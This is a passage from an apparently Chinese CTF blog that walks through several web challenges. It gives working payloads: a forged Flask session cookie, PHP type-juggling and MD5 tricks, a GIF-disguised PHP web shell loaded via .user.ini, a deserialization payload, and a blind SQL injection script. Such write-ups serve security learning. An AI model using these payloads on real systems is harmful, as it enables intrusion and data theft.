&lt;pre tabindex="0"&gt;&lt;code&gt;python flask_session_cookie_manager3.py encode -s &amp;#34;ckj123&amp;#34; -t &amp;#34;{&amp;#39;_fresh&amp;#39;: True, &amp;#39;_id&amp;#39;: b&amp;#39;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&amp;#39;, &amp;#39;csrf_token&amp;#39;: b&amp;#39;895783633ba12f15aedff2c4b355f0e9cb3158ee&amp;#39;, &amp;#39;image&amp;#39;: b&amp;#39;AYHD&amp;#39;, &amp;#39;name&amp;#39;: &amp;#39;admin&amp;#39;, &amp;#39;user_id&amp;#39;: &amp;#39;10&amp;#39;}&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;.eJw90MGKwkAMBuBXWXL2YLvdi-BBGC0KSamMDpOLuNtqO524UJWtI777zrrgLeQPH0nusDv09bmByaW_1iPYtRVM7vD2CROwGjNKcShyDOi4xVB5zLcOwyaQ2DGatcN0LWw2A5oyi72EhLtnJmXKepZgOL6TYceqagsV53QjhV4Iq0WLGlOKRmHwZs08sOoSUssUdZmxiZJhz8KNDauGc3IUljcbupTUykf_g5WXQrG3zk7hMYKvc3_YXb67-vQ6ofgjwzFQXNrKfECxA5mF55wFBcfWYULG_rD2LtYD6cZzOX1yreyP9Usqt365nv0np73EAPaVtCcYwfVc98-_QTKGxy8-U27W.YELpfA.vD1SVCAxOcwOPXc_DbwFqJT1TRg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;放在请求头中，格式为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;cookie: session=加密内容
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210306103214.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="解法二unicode欺骗"&gt;解法二：Unicode欺骗
&lt;/h2&gt;&lt;p&gt;第二种方法是利用代码中的strlower()函数的使用不当。这个函数分别在注册、登陆、修改密码的地方出现三次。这个方法的思路就是unicode加密三层，在最后一层修改密码时执行函数strlower()后修改到admin的密码。过程为&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ᴬᴰᴹᴵᴺ&amp;mdash;&amp;mdash;注册后&amp;mdash;&amp;mdash;&amp;gt;ADMIN&amp;mdash;修改密码&amp;mdash;&amp;gt;admin&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;ᴬᴰᴹᴵᴺ
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注册以后使用&lt;code&gt;ᴬᴰᴹᴵᴺ&lt;/code&gt;登陆，然后修改密码时实际修改的就是admin的密码了，然后登陆admin即可。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="极客大挑战-2019buyflag"&gt;[极客大挑战 2019]BuyFlag
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121104213.png"
loading="lazy"
&gt;网站题直接去看源码，在源码也搜索php有两个：index.php、pay.php。前者是首页，直接看后面的那个，打开就有提示&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Only Cuit&amp;rsquo;s students can buy the FLAG&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;应该还是一道http的套娃题。查看网页的请求发现Cookie中有一个user=0，很可疑，改成user=1，有了下一个提示：输入密码，并且源码中有一段php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;!--
~~~post money and password~~~
if (isset($_POST[&amp;#39;password&amp;#39;])) {
$password = $_POST[&amp;#39;password&amp;#39;];
if (is_numeric($password)) {
echo &amp;#34;password can&amp;#39;t be number&amp;lt;/br&amp;gt;&amp;#34;;
}elseif ($password == 404) {
echo &amp;#34;Password Right!&amp;lt;/br&amp;gt;&amp;#34;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;还记得php&lt;code&gt;==&lt;/code&gt;关系运算会强制转换类型，用POST传一个password=404a，&lt;code&gt;404a&lt;/code&gt;会被强制转换为&lt;code&gt;404&lt;/code&gt;，密码就对上了。接下来是钱的问题，flag需要&lt;strong&gt;100000000&lt;/strong&gt;块钱我们也去要传过去。如果直接传入这么长的会提示字符串过长，所以我想到了科学计数法，&lt;code&gt;10e10&lt;/code&gt;，就是10的10次方，通过。最终的请求：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;POST /pay.php HTTP/1.1
Host: 268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn/pay.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: user=1
Connection: close
password=404a&amp;amp;money=10e10
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="suctf-2019checkin"&gt;[SUCTF 2019]CheckIn
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201103750.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;知识点&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;准备好.user.ini文件内容为自动包含图片马，因为上传会检查文件头，所以添加了一个GIF文件头伪装：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GIF89a
auto_prepend_file=233.gif
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来上传图片马，尝试了正常上传PHP马会提示：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lt;? in contents!&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;所以使用script马执行php：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GIF89a
&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt;eval($_REQUEST[shell])&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上传成功后会提示文件路径：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Your dir uploads/852aff287f54bca0ed7757a702913e50
Your files :
array(5) { [0]=&amp;gt; string(1) &amp;ldquo;.&amp;rdquo; [1]=&amp;gt; string(2) &amp;ldquo;..&amp;rdquo; [2]=&amp;gt; string(9) &amp;ldquo;.user.ini&amp;rdquo; [3]=&amp;gt; string(7) &amp;ldquo;233.gif&amp;rdquo; [4]=&amp;gt; string(9) &amp;ldquo;index.php&amp;rdquo; }&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;这时候.user.ini文件已经会帮我们自动包含图片马了，所以我们只需要访问一个PHP文件即可，正好上传目录下有一个index.php文件，可以直接蚁剑连接或者POST请求system(&amp;lsquo;cat /flag&amp;rsquo;)。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf2020easy-md5"&gt;[BJDCTF2020]Easy MD5
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201105021.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class="link" href="https://www.jianshu.com/p/12125291f50d" target="_blank" rel="noopener"
&gt;【Jarvis OJ】Login&amp;ndash;password=&amp;rsquo;&amp;quot;.md5($pass,true).&amp;quot;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener"
&gt;sql注入：md5($password,true)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/" target="_blank" rel="noopener"
&gt;Leet More 2010 Oh Those Admins! writeup&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;随便输入一些东西都没有反应，在请求头中发现了一个Hint：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;select * from &amp;lsquo;admin&amp;rsquo; where password=md5($pass,true)&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;语法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;md5(string,raw)&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;string&lt;/td&gt;
&lt;td&gt;必需。要计算的字符串。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;raw&lt;/td&gt;
&lt;td&gt;可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;概括理解，这里如果raw参数为&lt;code&gt;true&lt;/code&gt;的话，这个函数的返回值是&lt;code&gt;string&lt;/code&gt;的md5加密值进行十六进制解码的字符串。这道题我当时是直接看了源码跳过了第一层，第一层的答案其实是&lt;code&gt;ffifdyop&lt;/code&gt;，我们来对它进行一波操作&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;源字符串：ffifdyop&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;md5加密值：276f722736c95d99e921722cf9ed621c&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;hex解码：&amp;lsquo;or'6É].é!r,ùíb.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后那几个应该是不可见字符，重要的是前面一段：&lt;code&gt;'or'6&lt;/code&gt;，这里还要说明一下，这提示应该不算严谨，真正的sql语句应该是在md5函数前后各一个&lt;code&gt;'&lt;/code&gt;单引号。执行以后真正的sql语句为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;select * from &amp;#39;admin&amp;#39; where password=&amp;#39;&amp;#39;or&amp;#39;6É].é!r,ùíb.‘
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到原理是构成一个闭合，这里还有第二个知识点，是or后面的字符串被认为是true，引用文章里的一段：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;a string starting with a &lt;code&gt;1&lt;/code&gt; is cast as an integer when used as a boolean.&lt;/p&gt;
&lt;p&gt;在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;自己进行的测试：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201113825.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201113839.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;所以真正的解法是只要sql语句的格式为password=&amp;lsquo;xxxxxxxx&amp;rsquo; or &amp;lsquo;1xxxx&amp;rsquo;，即hex包含字符串&amp;quot;276f722731&amp;quot;（&amp;lsquo;or'1），其实or后面开头只要是数字即可，1-9的hex范围为31-39。&lt;/p&gt;
&lt;p&gt;下面这个程序是这道题开头参考列表中的第三个链接。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
for ($i = 0;;) {
for ($c = 0; $c &amp;lt; 1000000; $c++, $i++)
if (stripos(md5($i, true), &amp;#39;\&amp;#39;or\&amp;#39;&amp;#39;) !== false)
echo &amp;#34;\nmd5($i) = &amp;#34; . md5($i, true) . &amp;#34;\n&amp;#34;;
echo &amp;#34;.&amp;#34;;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个程序遍历数字进行md5加密，使用stripos匹配是否有&lt;code&gt;'or'&lt;/code&gt;，这个函数有一个弊病就是如果是以&lt;code&gt;'or'&lt;/code&gt;开头的不会匹配到，并且我们需要的是or后面以数字开头都可以，所以需要稍微做一些修改，使用正则表达式由&lt;code&gt;\'or\'&lt;/code&gt;改为&lt;code&gt;'or'([1-9]+|0+[1-9])&lt;/code&gt; &lt;del&gt;不过我的方法自己还没跑出来🤣，回头加个多线程试一试&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;（更新）&lt;/p&gt;
&lt;p&gt;自己写了一个python程序，放在学生服务器上跑了一个下午加一个晚上，出了两个答案，好家伙从1跑到52亿：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210203094304.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt; 找到了md5(2413633098):
找到了md5(5207660362):
找到了md5(8351555222):
找到了md5(13095770027):
找到了md5(14860117901):
找到了md5(15724086109):
找到了md5(16529176061):
找到了md5(17428338265):
找到了md5(18717303578):
找到了md5(19342380396):
找到了md5(23960028257):
找到了md5(32561902614):
找到了md5(38983153698):
找到了md5(39742292223):
找到了md5(44120894060):
找到了md5(44820604888):
找到了md5(45570673322):
找到了md5(45855250502):
找到了md5(53660569009):
找到了md5(55098175010):
找到了md5(59763304323):
找到了md5(60185044906):
找到了md5(68625783421):
找到了md5(70949326264):
(md5值删了，因为乱码会影响博客的搜索功能)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;程序源码如下（自己写着玩，轻喷）：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;# codeing = utf-8
import threading
import hashlib
import re
import itertools
import time
# r&amp;#39;\&amp;#39;or\&amp;#39;([1-9]+|0+[1-9])&amp;#39;
# r&amp;#39;\&amp;#39;or\&amp;#39;&amp;#39;
pattern=re.compile(r&amp;#39;\&amp;#39;or\&amp;#39;([1-9]+|0+[1-9])&amp;#39;,re.I)
item = itertools.count(1)
def thrfunc():
while 1:
s2 = &amp;#39;&amp;#39;
temp = str(next(item))
s1 = hashlib.md5(temp.encode(encoding=&amp;#39;UTF-8&amp;#39;)).hexdigest()
for i in range(0, len(s1), 2):
s2 = s2 + chr(int(s1[i:i + 2], 16))
if re.search(pattern, s2):
print(&amp;#34;找到了md5(&amp;#34; + temp + &amp;#34;): &amp;#34; + s2)
threads=[]
for i in range(10):
t = threading.Thread(target=thrfunc)
threads.append(t)
t.start()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;虽然不知道多整几个能用的值可以干什么，但是觉得自己写的程序跑出来答案就很爽🤣。&lt;/p&gt;
&lt;p&gt;还有一个能用的md5值：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;content: 129581926211651571912466741651878684928
hex: 06da5430449f8f6f23dfc1276f722738
raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&amp;#39;or&amp;#39;8
string: T0Do#&amp;#39;or&amp;#39;8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以上是第一层。&lt;strong&gt;其实看了源码里只验证了字符串是否等于&lt;code&gt;ffifdyop&lt;/code&gt;我写的脚本里的值肯定通过不了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第二层可以直接在源码中看到注释。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$a = $GET[&amp;#39;a&amp;#39;];
$b = $_GET[&amp;#39;b&amp;#39;];
if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){
// wow, glzjin wants a girl friend.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;简单的md5以0E开头&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;a=QNKCDZO&amp;amp;b=240610708
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第三层&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
include &amp;#34;flag.php&amp;#34;;
highlight_file(__FILE__);
if($_POST[&amp;#39;param1&amp;#39;]!==$_POST[&amp;#39;param2&amp;#39;]&amp;amp;&amp;amp;md5($_POST[&amp;#39;param1&amp;#39;])===md5($_POST[&amp;#39;param2&amp;#39;])){
echo $flag;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这一有一些不同的是md5比较使用了&lt;code&gt;===&lt;/code&gt;不仅比较类型还比较值。但是md5有一个：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;md5([1,2,3]) == md5([4,5,6]) == NULL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以传入两个数组，又能保证两个变量不相等，md5加密有都是NULL且类型是数组类型，注意数组里的值还是不可以一样的。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;param1[]=1&amp;amp;param2[]=2
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="zjctf-2019nizhuansiwei"&gt;[ZJCTF 2019]NiZhuanSiWei
&lt;/h1&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$text = $_GET[&amp;#34;text&amp;#34;];
$file = $_GET[&amp;#34;file&amp;#34;];
$password = $_GET[&amp;#34;password&amp;#34;];
if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&amp;#39;r&amp;#39;)===&amp;#34;welcome to the zjctf&amp;#34;)){
echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;#34;.file_get_contents($text,&amp;#39;r&amp;#39;).&amp;#34;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;#34;;
if(preg_match(&amp;#34;/flag/&amp;#34;,$file)){
echo &amp;#34;Not now!&amp;#34;;
exit();
}else{
include($file); //useless.php
$password = unserialize($password);
echo $password;
}
}
else{
highlight_file(__FILE__);
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;先来一段&lt;a class="link" href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener"
&gt;PHP伪协议总结&lt;/a&gt;，这题的第一步是判断传入text参数并读取内容，判断内容为&lt;strong&gt;welcome to the zjctf&lt;/strong&gt;，使用&lt;code&gt;data://&lt;/code&gt;伪协议。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?text=data://text/plain,welcome to the zjctf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来是文件包含，有了提示&lt;code&gt;useless.php&lt;/code&gt;肯定要读一读看看，使用&lt;code&gt;php://filter&lt;/code&gt;伪协议。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?text=data://text/plain,welcome to the zjctf&amp;amp;file=php://filter/convert.base64-encode/resource=useless.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到的内容&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class Flag{ //flag.php
public $file;
public function __tostring(){
if(isset($this-&amp;gt;file)){
echo file_get_contents($this-&amp;gt;file);
echo &amp;#34;&amp;lt;br&amp;gt;&amp;#34;;
return (&amp;#34;U R SO CLOSE !///COME ON PLZ&amp;#34;);
}
}
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;并且文件包含下面有一个反序列化，又看到了&lt;code&gt;__tostring&lt;/code&gt;函数，&lt;strong&gt;当一个对象被当作字符串对待的时候，会触发这个魔术方法&lt;/strong&gt;。我构造的对象&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class Flag{
public $file=&amp;#34;flag.php&amp;#34;;
}
$f = new Flag();
echo serialize($f);
//O:4:&amp;#34;Flag&amp;#34;:1:{s:4:&amp;#34;file&amp;#34;;s:8:&amp;#34;flag.php&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在传入对象之前当然要把读取文件流改为正常包含文件了。最终payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?text=data://text/plain,welcome to the zjctf&amp;amp;file=useless.php&amp;amp;password=O:4:&amp;#34;Flag&amp;#34;:1:{s:4:&amp;#34;file&amp;#34;;s:8:&amp;#34;flag.php&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="ciscn2019-华北赛区-day2-web1hack-world"&gt;[CISCN2019 华北赛区 Day2 Web1]Hack World
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307171921.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;很明显的sql注入，随便尝试一些语句有&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1 &amp;raquo; Hello, glzjin wants a girlfriend.&lt;/p&gt;
&lt;p&gt;2 &amp;raquo; Do you want to be my girlfriend?&lt;/p&gt;
&lt;p&gt;3之后都是 &amp;raquo; Error Occured When Fetch Result.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;输入一个单引号&lt;code&gt;1'&lt;/code&gt;出现了&lt;code&gt;bool(false)&lt;/code&gt;，是一个布尔类型返回，就很有可能是盲注之类的。测试的时候还发现空格被过滤了，空格被过滤可以尝试使用TAB制表符代替。&lt;/p&gt;
&lt;p&gt;题目中也有提示&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id="all-you-want-is-in-table-flag-and-the-column-is-flag"&gt;All You Want Is In Table &amp;lsquo;flag&amp;rsquo; and the column is &amp;lsquo;flag&amp;rsquo;
&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;说明flag在flag表的flag字段中。以下是一个布尔盲注的脚本，思路就是查询flag的值使用&lt;code&gt;substr&lt;/code&gt;函数每次截取一个字符，获得其&lt;code&gt;ascii&lt;/code&gt;值再使用二分法确定具体的值，最后拼接输出。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; time
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;url &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;http://26670c55-697e-4520-ae0a-bd23a786cd72.node3.buuoj.cn/&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;result &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; x &lt;span style="color:#f92672"&gt;in&lt;/span&gt; range(&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;50&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; high &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;127&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; low &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;32&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; mid &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (low &lt;span style="color:#f92672"&gt;+&lt;/span&gt; high) &lt;span style="color:#f92672"&gt;//&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;while&lt;/span&gt; high&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;low:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;if(ascii(substr((select flag from flag),&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%d&lt;/span&gt;&lt;span style="color:#e6db74"&gt;,1))&amp;gt;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;%d&lt;/span&gt;&lt;span style="color:#e6db74"&gt;,1,2)&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;%&lt;/span&gt; (x, mid)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; data &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;id&amp;#34;&lt;/span&gt;:payload
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; time&lt;span style="color:#f92672"&gt;.&lt;/span&gt;sleep(&lt;span style="color:#ae81ff"&gt;0.3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; response &lt;span style="color:#f92672"&gt;=&lt;/span&gt; requests&lt;span style="color:#f92672"&gt;.&lt;/span&gt;post(url, data &lt;span style="color:#f92672"&gt;=&lt;/span&gt; data)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;Hello&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;in&lt;/span&gt; response&lt;span style="color:#f92672"&gt;.&lt;/span&gt;text:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; low&lt;span style="color:#f92672"&gt;=&lt;/span&gt;mid&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; high &lt;span style="color:#f92672"&gt;=&lt;/span&gt; mid
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; mid &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (low&lt;span style="color:#f92672"&gt;+&lt;/span&gt;high)&lt;span style="color:#f92672"&gt;/&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; result &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; chr(int(mid))
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(result)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#flag{929c8993-2d85-4fbf-8e48-7c457551105e}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="极客大挑战-2019hardsql"&gt;[极客大挑战 2019]HardSQL
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210307173126.png"
loading="lazy"
&gt;&lt;/p&gt;
